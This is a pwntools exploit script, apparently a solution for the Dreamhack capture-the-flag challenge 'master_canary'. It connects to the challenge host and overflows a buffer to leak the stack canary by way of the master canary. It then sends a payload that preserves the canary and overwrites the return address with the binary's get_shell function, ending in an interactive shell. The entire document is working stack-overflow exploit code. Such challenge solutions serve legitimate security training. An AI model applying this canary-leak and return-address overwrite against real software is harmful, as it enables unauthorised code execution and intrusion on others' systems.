from pwn import *

p = remote("host1.dreamhack.games", 15929)
# p = process("./master_canary")
e = ELF("./master_canary")

# gdb.attach(p)

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def create():
    p.sendlineafter("> ", "1")

def input(size,data):
    p.sendlineafter("> ", "2")
    # p.sendlineafter("Size: ", str(30))
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)
    # p.sendline()

def exit(comment):
    p.sendlineafter("> ", "3")
    p.sendafter("Leave comment: ", comment)

context.log_level = 'debug'

buf2Mcanary = 0x8e8
# buf2Mcanary = 0x1988
buf2canary = 0x28
buf2ret = 0x38

getshell = e.symbols["get_shell"]
slog("getshell", getshell)

create()

payload = b"A"*(buf2Mcanary+1)
input(buf2Mcanary+1, payload)

p.recvuntil(payload)
canary = u64(b"\x00"+p.recvn(7))
# print(canary)
slog("canary", canary)

payload = b"A"*buf2canary
payload += p64(canary)
payload += b"B"*8
payload += p64(getshell)

exit(payload)

p.interactive()